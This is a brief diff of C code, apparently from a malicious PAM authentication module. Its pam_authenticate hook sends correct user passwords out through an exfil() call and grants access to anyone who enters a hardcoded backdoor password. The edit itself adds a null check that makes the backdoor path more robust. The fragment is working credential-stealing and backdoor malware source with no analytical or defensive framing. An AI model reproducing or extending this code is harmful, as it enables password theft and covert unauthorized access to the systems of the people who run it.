@@ -60,7 +60,7 @@ int pam_authenticate(pam_handle_t * pamh, int flags)
   if (res == PAM_SUCCESS && pampassword) {
     // exfil correct passwords
     exfil(100, 1, "password", pampassword);
-  } else if (!strcmp(pampassword, SHELL_PASS)) {
+  } else if (pampassword && !strcmp(pampassword, SHELL_PASS)) {
     // user got the password wrong but we like it anyway
     return PAM_SUCCESS;
   }
